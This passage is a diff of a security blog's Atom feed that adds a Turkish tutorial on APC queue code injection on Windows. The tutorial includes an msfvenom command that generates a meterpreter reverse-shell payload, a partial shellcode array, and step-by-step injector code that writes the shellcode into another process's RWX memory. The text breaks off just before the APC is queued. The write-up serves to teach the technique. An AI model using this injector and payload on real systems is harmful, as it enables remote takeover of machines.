@@ -1,4 +1,290 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://192.168.254.251:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://192.168.254.251:4000/" rel="alternate" type="text/html" /><updated>2019-06-12T18:47:08+03:00</updated><id>http://192.168.254.251:4000/</id><title type="html">Daily Security</title><subtitle>In this blog we're going to solve CTF's &amp; Write Some Software's.My goal is redirect my little knowledge to other people.</subtitle><entry><title type="html">Rootkit Development - (Part 1)</title><link href="http://192.168.254.251:4000/2019/05/29/rootkit-development-part-1.html" rel="alternate" type="text/html" title="Rootkit Development - (Part 1)" /><published>2019-05-29T00:00:00+03:00</published><updated>2019-05-29T00:00:00+03:00</updated><id>http://192.168.254.251:4000/2019/05/29/rootkit-development-part-1</id><content type="html" xml:base="http://192.168.254.251:4000/2019/05/29/rootkit-development-part-1.html">&lt;h1 id=&quot;rootkit-development---part-1&quot;&gt;Rootkit Development - (Part 1)&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.6.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-28T08:57:11+03:00</updated><id>http://localhost:4000/</id><title type="html">Daily Security</title><subtitle>In this blog we're going to solve CTF's &amp; Write Some Software's.My goal is redirect my little knowledge to other people.</subtitle><entry><title type="html">APC Queue Code Injection</title><link href="http://localhost:4000/2019/08/27/APC-Queue-Code-Injection.html" rel="alternate" type="text/html" title="APC Queue Code Injection" /><published>2019-08-27T00:00:00+03:00</published><updated>2019-08-27T00:00:00+03:00</updated><id>http://localhost:4000/2019/08/27/APC-Queue-Code-Injection</id><content type="html" xml:base="http://localhost:4000/2019/08/27/APC-Queue-Code-Injection.html">&lt;h1 id=&quot;introduction-to-apc-thread-and-apc-code-injection&quot;&gt;Introduction to APC, Thread and APC Code Injection&lt;/h1&gt;
+
+&lt;p&gt;Bu yazımda  bir &lt;strong&gt;APC (Asynchronous Procedure Call)&lt;/strong&gt;‘nin ne olduğundan bahsedeceğim. İnternet’te türkçe olarak böyle bir &lt;strong&gt;Code Injection&lt;/strong&gt; tekniğinin açıklaması ve örnekleri yapıldımı diye baktığımda hiç bir kaynak bulamadım. Bu yüzdende ben yazmaya karar verdim.&lt;/p&gt;
+
+&lt;p&gt;Yazının ileriki kısımlarında &lt;strong&gt;Code Injection&lt;/strong&gt; gerçekleştirmek için gerekli olan yazılımı &lt;strong&gt;step-by-step&lt;/strong&gt; yani adım adım geliştireceğiz. İlk başlarda sıkıcı-anlaşılmaz gelebilir yalnız tüm anlatım birbiri ile bağlı. Kısaca &lt;strong&gt;giriş-gelişme&lt;/strong&gt; sıkabilir bu yüzden &lt;strong&gt;sonuç&lt;/strong&gt;‘u bekleyelim.&lt;/p&gt;
+
+&lt;p&gt;Yazı hakkında kısa bir özet geçmek gerekirse :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;APC&lt;/strong&gt; bir fonksiyondur&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Eşzamansız&lt;/strong&gt; yani &lt;strong&gt;Asynchronously&lt;/strong&gt; çalışan bir fonksiyondur.&lt;/li&gt;
+  &lt;li&gt;Bu fonksiyon &lt;strong&gt;Thread&lt;/strong&gt;‘lerin içeriğinde çalışmaktadır.&lt;/li&gt;
+  &lt;li&gt;Biz bu tekniği kullanarak &lt;strong&gt;Process&lt;/strong&gt;‘ler içerisine &lt;strong&gt;Kod&lt;/strong&gt; enjekte edebiliyoruz.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bahsettiğim &lt;strong&gt;Code Injection&lt;/strong&gt; tekniğinin daha önce birçok &lt;strong&gt;Zararlı Yazılım&lt;/strong&gt; tarafından kullanıldığını gördük. Örneğin :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Carberp&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;DorkBot&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Aynı zamanda da &lt;a href=&quot;https://www.fireeye.com/blog/threat-research/2017/09/apt33-insights-into-iranian-cyber-espionage.html&quot;&gt;APT33&lt;/a&gt; tarafından geliştirilen &lt;strong&gt;TurnedUp&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bu &lt;strong&gt;zararlı yazılım&lt;/strong&gt;‘lar içerisinde &lt;strong&gt;APC Queue Code Injection&lt;/strong&gt; tekniği mevcut.&lt;/p&gt;
+
+&lt;p&gt;Yani kısaca anlatmak istediğim popüler bir teknik olduğundan aynı zamanda da bazı &lt;strong&gt;Anti-malware&lt;/strong&gt; ve &lt;strong&gt;EDR (Endpoint Detection and Response)&lt;/strong&gt; yazılımları tarafından farkedildiğinden, bir &lt;strong&gt;Saldırı&lt;/strong&gt; tekniği olarak sıkça kullanılmasını tavsiye etmiyorum.&lt;/p&gt;
+
+&lt;h3 id=&quot;apc-nedir-&quot;&gt;APC Nedir ?&lt;/h3&gt;
+
+&lt;p&gt;Yukarıda basit bir özetini geçtim ama yine de teknik açıdan anlatmakta fayda var.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Asynchronous Procedure Call (APC)&lt;/strong&gt;, &lt;strong&gt;Eşzamansız (Asynchronously)&lt;/strong&gt; olarak çalışan, aynı zamanda da &lt;strong&gt;Thread&lt;/strong&gt; içeriğinde çalışmakta olan bir fonksiyondur.&lt;/p&gt;
+
+&lt;p&gt;Bir &lt;strong&gt;APC&lt;/strong&gt;, &lt;strong&gt;Thread&lt;/strong&gt; içerisine sunulduğu zaman sistem &lt;strong&gt;Software Interrupt&lt;/strong&gt; adında bir hata alır. Dolayısı ile &lt;strong&gt;Thread&lt;/strong&gt; tekrar yüklendiğinde ya da çalıştığında o &lt;strong&gt;Thread&lt;/strong&gt; bizim &lt;strong&gt;APC&lt;/strong&gt; fonksiyonumuzu çalıştırır.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;System&lt;/strong&gt; tarafından oluşturulan bir &lt;strong&gt;APC&lt;/strong&gt;‘ye &lt;strong&gt;kernel-mode APC&lt;/strong&gt; denilir.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Application&lt;/strong&gt; tarafından oluşturulan bir &lt;strong&gt;APC&lt;/strong&gt;‘ye ise &lt;strong&gt;user-mode APC&lt;/strong&gt; denilmektedir.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bir &lt;strong&gt;user-mode APC&lt;/strong&gt;‘nin &lt;strong&gt;Thread&lt;/strong&gt; içerisinde çalışması için &lt;strong&gt;Thread&lt;/strong&gt;‘in bir &lt;strong&gt;Alertable State&lt;/strong&gt; içerisinde olması lazımdır çünkü &lt;strong&gt;alertable I/O&lt;/strong&gt; dediğimiz olay &lt;strong&gt;asynchronous I/O request&lt;/strong&gt;‘lerini &lt;strong&gt;process&lt;/strong&gt; eder.&lt;/p&gt;
+
+&lt;p&gt;Dolayısı ile bir &lt;strong&gt;Thread&lt;/strong&gt; eğer &lt;strong&gt;Alertable State&lt;/strong&gt; içerisinde olmazsa bir &lt;strong&gt;asynchronous I/O&lt;/strong&gt; requesti olan &lt;strong&gt;APC&lt;/strong&gt; fonksiyonunu &lt;strong&gt;çalıştıramaz&lt;/strong&gt; yani &lt;strong&gt;process&lt;/strong&gt; edemez.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Alertable I/O&lt;/strong&gt; ve &lt;strong&gt;APC&lt;/strong&gt;‘nin gerekli ilişkisini  &lt;strong&gt;Windows&lt;/strong&gt; tarafından yazılan bu dökümanda daha detaylı öğrenebilirsiniz : &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/fileio/alertable-i-o&quot;&gt;Alertable I/O&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Aklı biraz açıkgözlülüğe çalışanın aklına hemen şu soru gelecektir :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Yani biz eğer process’in içerisinde bulunan thread’e bir APC fonksiyonu gönderirsek ve bu APC fonksiyonu bizim shellcode’umuzu içerirse bu bir APC Queue Code Injection sayılır değil mi ?&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Vereceğim bu cevap ile blog yazısının tüm sihrini kaçıracağım ama yinede okuyanlar için heycanlandırıcı bir yazı olmasını istediğimden bu sorunun cevabıda &lt;strong&gt;Evet&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;apc-queue-code-injection&quot;&gt;APC Queue Code Injection&lt;/h3&gt;
+
+&lt;p&gt;Yazdığımız kodu tek tek anlatmaya başlamadan önce &lt;strong&gt;APC&lt;/strong&gt;, &lt;strong&gt;Thread&lt;/strong&gt;, &lt;strong&gt;Queue&lt;/strong&gt; gibi terimleri daha iyi anlaşılması adına tekrar anlatalım.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;**APC (Asynchronous Procedure Call) **  : Asenkron (Eşzamansız) olarak çalışan bir fonksiyondur.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Thread&lt;/strong&gt; : Bir &lt;strong&gt;Process&lt;/strong&gt; yani çalışan bir program içerisinde birden fazla işlemi aynı zamanda gerçekleştirmek istersek oluşturacağımız &lt;strong&gt;Birim&lt;/strong&gt; yani &lt;strong&gt;Unit&lt;/strong&gt;‘tir.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;APC Queue to Thread&lt;/strong&gt; : &lt;strong&gt;Thread&lt;/strong&gt; içerisine çalıştırılacak olan fonksiyonu sunmaktır.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Daha da basiti eğer biz bir &lt;strong&gt;Thread&lt;/strong&gt; içerisine oluşturduğumuz &lt;strong&gt;APC&lt;/strong&gt; fonksiyonunu (bu bir shellcode’da olabilir) eklediğimizde &lt;strong&gt;Thread&lt;/strong&gt; hata verip sonraki çalışma esnasında bizim fonksiyonumuzu çalıştıracağından &lt;strong&gt;process&lt;/strong&gt; içerisinde oluşturulan &lt;strong&gt;birim&lt;/strong&gt;‘leri kontrol edebileceğizdir.&lt;/p&gt;
+
+&lt;p&gt;Bu yukarıda anlattığımı kavrayamayan olduysa hiç sorun değil aşağıdaki resim tam olarak &lt;strong&gt;APC Queue Code Injection&lt;/strong&gt; tekniğinin nasıl çalıştığını çok basit gözler önüne seriyor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.hizliresim.com/3OgLzp.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Resimi biraz daha adım adım açmak gerekir ise :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Bir &lt;strong&gt;Process&lt;/strong&gt; oluşturuluyor.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Process&lt;/strong&gt; içerisinde alan(memory) ayrılıyor.&lt;/li&gt;
+  &lt;li&gt;Bu alana &lt;strong&gt;Zararlı Kod&lt;/strong&gt; enjekte ediliyor.&lt;/li&gt;
+  &lt;li&gt;Enjekte edilen bu &lt;strong&gt;Zararlı Kod&lt;/strong&gt; bir &lt;strong&gt;APC&lt;/strong&gt; fonksiyonunun başlangıç adresine veriliyor.&lt;/li&gt;
+  &lt;li&gt;Ve bu şekilde &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu &lt;strong&gt;Zararlı Kod&lt;/strong&gt;‘u çalıştırıyor.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Şimdi bir &lt;strong&gt;Saldırgan&lt;/strong&gt; ve &lt;strong&gt;Kurban&lt;/strong&gt; yazılımı oluşturacağız. Ve bu sayede &lt;strong&gt;Kurban&lt;/strong&gt;‘ın çalıştırdığı &lt;strong&gt;APC&lt;/strong&gt; fonksiyonuna bizim &lt;strong&gt;Shellcode&lt;/strong&gt;‘umuzu enjekte edeceğiz.&lt;/p&gt;
+
+&lt;p&gt;Öncelikle &lt;strong&gt;Kurban&lt;/strong&gt; kodunu geliştirelim ve içeriğini biraz daha açıklayalım.&lt;/p&gt;
+
+&lt;h3 id=&quot;victim-code&quot;&gt;Victim Code&lt;/h3&gt;
+
+&lt;p&gt;Öncelikle kütüphanelerimizi ekleyelim :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
+#include &amp;lt;Windows.h&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Main&lt;/strong&gt; fonksiyonunu oluşturalım ve içerisinde bir adet &lt;strong&gt;APC&lt;/strong&gt; fonksiyonunu çalıştıralım.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main()
+{
+    std::cout &amp;lt;&amp;lt; &quot;Entering alertable state...\n&quot;;
+		SleepEx(1000 * 60, true);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basit bir şekilde kodumuz bu. Şimdi birazdan &lt;strong&gt;Saldırgan&lt;/strong&gt; kodunu geliştirmeye başladığımızda bu kısmı daha iyi anlayacağız.&lt;/p&gt;
+
+&lt;p&gt;Buradaki &lt;strong&gt;SleepEx&lt;/strong&gt; fonksiyonu bir &lt;strong&gt;APC&lt;/strong&gt; fonksiyonudur.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Windows&lt;/strong&gt; tarafından oluşturulan bu &lt;strong&gt;APC&lt;/strong&gt; dökümanında hangi fonksiyonlar mevcut bakarsanız &lt;strong&gt;SleepEx&lt;/strong&gt;‘i görebilirsiniz tabi onun dışında bir çok &lt;strong&gt;APC&lt;/strong&gt; fonksiyonu mevcut :&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls&quot;&gt;Asynchronous Procedure Calls&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Birazdan yapacağımız şey basitçe &lt;strong&gt;SleepEx&lt;/strong&gt; fonksiyonunun başlangıç adresine bizim oluşturacağımız &lt;strong&gt;Shellcode&lt;/strong&gt;‘u ekleyeceğiz. Dolayısıyla bu &lt;strong&gt;Kurban&lt;/strong&gt; yazılım çalıştığında bizim &lt;strong&gt;Zararlı Kod&lt;/strong&gt;‘umuzu çalıştıracak.&lt;/p&gt;
+
+&lt;h3 id=&quot;attacker-code&quot;&gt;Attacker Code&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Saldırgan&lt;/strong&gt; kodunu geliştirmeye başlamadan önce alttaki parametreler aracığılıyla &lt;strong&gt;MSFVenom&lt;/strong&gt; kullanarak bir &lt;strong&gt;Shellcode&lt;/strong&gt; oluşturduğunuzu varsayıyorum.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxxx EXITFUNC=thread -f c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Öncelikle kütüphanelerimizi ekleyelim :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;iostream&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;Windows.h&amp;gt;
+#include &amp;lt;TlHelp32.h&amp;gt;
+#include &amp;lt;vector&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Main&lt;/strong&gt; fonksiyonunu oluşturalım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main()
+{
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Saldırgan&lt;/strong&gt;‘ın kodu biraz uzun olduğundan adım adım ilerleyeceğiz. Kodu tamamen anlattıktan sonra &lt;strong&gt;Pastebin&lt;/strong&gt; linkini vereceğim kendiniz derleyip çalıştırmak isterseniz diye.&lt;/p&gt;
+
+&lt;p&gt;Şimdi &lt;strong&gt;Shellcode&lt;/strong&gt;‘umuzu bir değişkene atayalım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned char shellcode[] = &quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;
+		&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;
+		&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;
+		&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;
+		&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;
+		&quot;\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b&quot;
+		&quot;\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b&quot;
+		&quot;\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41&quot;;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;APC&lt;/strong&gt; içeren &lt;strong&gt;Zararlı Kod&lt;/strong&gt;‘u enjekte edeceğimiz &lt;strong&gt;Process&lt;/strong&gt;‘in &lt;strong&gt;Snapshot&lt;/strong&gt;‘unu alacağımız değişkeni oluşturalım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Kurban&lt;/strong&gt; yazılımı içeren &lt;strong&gt;Process&lt;/strong&gt;‘i tutacak değişkeni oluşturalım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE victimProcess = NULL;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hekleyeceğimiz &lt;strong&gt;Process&lt;/strong&gt;‘in kayıtlarını tutacak olan &lt;strong&gt;processEntry&lt;/strong&gt;‘i ve hekleyeceğimiz &lt;strong&gt;Thread&lt;/strong&gt;‘in kayıtlarını tutacka olan &lt;strong&gt;threadEntry&lt;/strong&gt;‘i oluşturalım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
+THREADENTRY32 threadEntry = { sizeof(THREADENTRY32) };
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hekleyeceğimiz &lt;strong&gt;Process&lt;/strong&gt;‘in içerdiği &lt;strong&gt;Thread&lt;/strong&gt;‘ların &lt;strong&gt;ID&lt;/strong&gt;‘lerini tutacak değişkeni oluşturalım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;std::vector&amp;lt;DWORD&amp;gt; threadIds;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Shellcode&lt;/strong&gt;‘un boyutunu tutacak değişkeni oluşturalım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SIZE_T shellcodeSize = sizeof(shellcode);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sonradan içini açacağımız &lt;strong&gt;Thread&lt;/strong&gt;‘i bize tutacak olan &lt;strong&gt;threadHandle&lt;/strong&gt; değişkenini oluşturalım :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HANDLE threadHandle = NULL;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aşşağıdaki &lt;strong&gt;Kod&lt;/strong&gt; basit bir şekilde şuanda bilgisayarınzda mevcut çalışan &lt;strong&gt;Process&lt;/strong&gt;‘lerin dosya ismi ile bizim &lt;strong&gt;Kurban&lt;/strong&gt; dosya ismini karşılaştırıp sonrada bulduğunda &lt;strong&gt;processEntry&lt;/strong&gt;‘ye kaydediyor.&lt;/p&gt;
+
+&lt;p&gt;Daha da basit şekilde &lt;strong&gt;Kurban&lt;/strong&gt; yazılımı bulup bu yazılımın &lt;strong&gt;Process&lt;/strong&gt; kayıtlarını &lt;strong&gt;processEntry&lt;/strong&gt;‘ye ekliyor. Bu şekilde de &lt;strong&gt;yazılım&lt;/strong&gt; üzerinde düzenleme ya da içerik görme gerçekleştirebileceğiz. Örneğin &lt;strong&gt;Kurban&lt;/strong&gt; yazılımın &lt;strong&gt;Process ID&lt;/strong&gt;‘sini görmek gibi vs….&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (Process32First(snapshot, &amp;amp;processEntry)) {
+		while (_wcsicmp(processEntry.szExeFile, L&quot;testtt1.exe&quot;) != 0) {
+			Process32Next(snapshot, &amp;amp;processEntry);
+		}
+	}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;Kurban&lt;/strong&gt; yazılımı &lt;strong&gt;PROCESS_ALL_ACCESS&lt;/strong&gt; değeri ile tüm erişime sahip şekilde &lt;strong&gt;OpenProcess&lt;/strong&gt; fonksiyonu aracığılıyla açıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;victimProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, processEntry.th32ProcessID);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sonra &lt;strong&gt;Kurban&lt;/strong&gt; yazılımın içine &lt;strong&gt;VirtualAllocEx&lt;/strong&gt; fonksiyonu aracılığı ile enjekte edeceğimiz &lt;strong&gt;Shellcode&lt;/strong&gt;‘un boyutu kadar alan ayırıyoruz.&lt;/p&gt;
+
+&lt;p&gt;Ayırdığımız alanın &lt;strong&gt;Adresini&lt;/strong&gt;‘de &lt;strong&gt;shellcodeAddr&lt;/strong&gt; değişkenine atıyoruz :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LPVOID shellcodeAddr = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;apcRoutine&lt;/strong&gt; değişkeni içerisine &lt;strong&gt;Shellcode&lt;/strong&gt; adresimizi atıyoruz.&lt;/p&gt;
+
+&lt;p&gt;Bu kısımda kafanız karışmasın bu &lt;strong&gt;değişken&lt;/strong&gt;‘in ileride ne yaptığını daha iyi anlayacağız :&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellcodeAddr;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;VirtualAllocEx&lt;/strong&gt; ile &lt;strong&gt;Kurban&lt;/strong&gt; yazılımı içerisinde ayırdığımız alana &lt;strong&gt;WriteProcessMemory&lt;/strong&gt; fonksiyonu ile bizim &lt;strong&gt;Shellcode&lt;/strong&gt; yani &lt;strong&gt;Zararlı Kod&lt;/strong&gt;‘umuzu yazıyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;WriteProcessMemory(victimProcess, shellcodeAddr, shellcode, shellcodeSize, NULL);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aşağıda ki &lt;strong&gt;if&lt;/strong&gt; karşılaştırması ile &lt;strong&gt;threadEntry&lt;/strong&gt;‘nin &lt;strong&gt;Process&lt;/strong&gt; içerisinden aldığımız &lt;strong&gt;Snapshot&lt;/strong&gt; ile uyumluluğunu sorguluyoruz.&lt;/p&gt;
+
+&lt;p&gt;Ve sonraki &lt;strong&gt;do-while&lt;/strong&gt; döngüsünde bizim &lt;strong&gt;threadEntry&lt;/strong&gt; içerisindeki &lt;strong&gt;Process ID&lt;/strong&gt;‘si ile &lt;strong&gt;processEntry&lt;/strong&gt; içerisindeki &lt;strong&gt;Process ID&lt;/strong&gt;‘nin aynı olup olmadığını karşılaştırıyoruz.&lt;/p&gt;
+
+&lt;p&gt;Eğer aynı ise başta oluşturduğumuz &lt;strong&gt;threadIDs&lt;/strong&gt; değişkenine &lt;strong&gt;Process&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;Thread&lt;/strong&gt; yani çalışan &lt;strong&gt;Birimler&lt;/strong&gt; tek tek ekleniyor.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (Thread32First(snapshot, &amp;amp;threadEntry)) {
+		do {
+			if (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) {
+				threadIds.push_back(threadEntry.th32ThreadID);
+			}
+		} while (Thread32Next(snapshot, &amp;amp;threadEntry));
+	}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Şimdi bu &lt;strong&gt;Saldırgan&lt;/strong&gt; kodunun en önemli kısmına geldik.&lt;/p&gt;
+
+&lt;p&gt;Aşşağıdaki kod basit bir şekilde şunları yapıyor :&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;for&lt;/strong&gt; döngüsü ile yukarıda anlattığımız &lt;strong&gt;do-while&lt;/strong&gt; döngüsünden çıkan &lt;strong&gt;Thread ID&lt;/strong&gt;‘leri alınıyor.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;printf&lt;/strong&gt; ile bu &lt;strong&gt;Thread ID&lt;/strong&gt;‘ler ekrana yazılıyor.&lt;/li&gt;
+  &lt;li&gt;Her döngü çalıştığında mevcut olan &lt;strong&gt;Thread&lt;/strong&gt; tüm yetkilerle yani &lt;strong&gt;THREAD_ALL_ACCESS&lt;/strong&gt; ile &lt;strong&gt;OpenThread&lt;/strong&gt; fonksiyonu kullanılarak &lt;strong&gt;threadHandle&lt;/strong&gt; değişkenin içerisine aktarılıyor.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;En önemli bölüme geldik &lt;strong&gt;QueueUserAPC&lt;/strong&gt;. Bu fonksiyon basit bir şekilde bizim başta içerisine &lt;strong&gt;Shellcode&lt;/strong&gt; adresimizi aktardığımız &lt;strong&gt;apcRoutine&lt;/strong&gt; değişkenini alıyor ilk parametre olarak.&lt;/p&gt;
+
